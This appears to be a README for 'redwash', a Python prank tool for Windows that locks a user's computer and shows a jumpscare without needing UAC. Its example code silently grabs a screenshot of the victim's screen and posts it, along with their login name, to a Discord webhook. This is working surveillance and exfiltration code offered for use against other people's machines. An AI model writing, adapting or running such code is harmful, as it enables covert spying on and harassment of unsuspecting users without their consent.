# redwash
A Python (for Windows) troll script that locks the user's computer and jumpscares them. Does not require UAC.

## Example Usage
```python
def otherCode():
    # This is an example of some code you can execute in the background when redwash is running.
    # In this example, we take a screenshot of the user's computer and upload it to a discord webhook.

    # Take a screenshot of the PC
    screenshot = ImageGrab.grab()
    buffered = BytesIO()
    screenshot.save(buffered, format="PNG")

    # Your Discord webhook URL
    webhook_url = 'your_webhook_url'

    # Prepare the payload
    files = {'file': ('screenshot.png', buffered.getvalue(), 'image/png')}
    data = {'payload_json': dumps({"content": getlogin() + " just executed the script!", "username": "redwash", "avatar_url": "https://cdn.discordapp.com/attachments/1193058123733282998/1193058403862454282/terxture.png?ex=65ab5539&is=6598e039&hm=05040b88e1d2b6500f983e13bfd262ffee851d8c973d5ff4eb1e8016ea396e6a&"})}

    # POST request to the Discord webhook
    res = post(webhook_url, files=files, data=data)

if __name__ == "__main__":
    redwash(True, True, True, True, True, False, otherCode)
```
